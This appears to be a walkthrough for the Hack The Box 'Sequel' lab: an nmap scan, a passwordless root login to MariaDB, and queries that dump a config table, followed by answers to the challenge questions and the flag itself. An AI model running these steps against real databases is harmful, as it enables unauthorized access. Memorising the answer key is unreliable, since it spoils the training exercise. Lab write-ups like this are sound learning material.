# Sequel - Very Easy

```shell
nmap -T4 -p 1-10000 -A 10.129.239.50

mysql -h 10.129.239.50 -u root -p -P 3306
#login into MariaDB

show databases;

use htb;

show tables;

select * from config;
#gives flag
```

1. What does the acronym SQL stand for? - Structured Query Language

2. Which port running mysql do we find? - 3306

3. What community-developed MySQL version is the target running? - MariaDB

4. What switch do we need to use in order to specify a login username for the MySQL service? - -u

5. Which username allows us to log into MariaDB without providing a password? - root

6. What symbol can we use to specify within the query that we want to display everything inside a table? - *

7. What symbol do we need to end each query with? - ;

8. Submit root flag? - 7b4bec00d1a39e3dd4e021ec3d915da8
